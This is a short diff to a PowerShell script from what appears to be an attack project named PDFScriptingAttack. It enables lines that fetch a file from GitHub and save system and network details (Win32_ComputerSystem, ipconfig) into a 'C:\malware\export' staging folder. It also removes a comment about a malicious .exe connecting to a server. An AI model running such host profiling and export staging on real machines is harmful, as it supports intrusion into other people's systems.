@@ -4,10 +4,9 @@
 if (-not (Test-Path -Path "C:\malware\export")){
     New-Item -Path 'C:\malware\export' -ItemType Directory
 }
-# Invoke-WebRequest -Uri https://raw.githubusercontent.com/lewisk1899/PDFScriptingAttack/master/README.md -OutFile C:\malware\README.md
-# Write-Output "Here we would invoke an installation for Node.js to ensure that our malicious .exe has the necessary packages to run and connect to the server"
-# Get-WmiObject -Class Win32_ComputerSystem | Out-file -FilePath "C:\malware\export\systeminfo.txt"
-# ipconfig | Out-file -FilePath "C:\malware\export\netinfo.txt"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/lewisk1899/PDFScriptingAttack/master/README.md -OutFile C:\malware\README.md
+Get-WmiObject -Class Win32_ComputerSystem | Out-file -FilePath "C:\malware\export\systeminfo.txt"
+ipconfig | Out-file -FilePath "C:\malware\export\netinfo.txt"
 
 
 
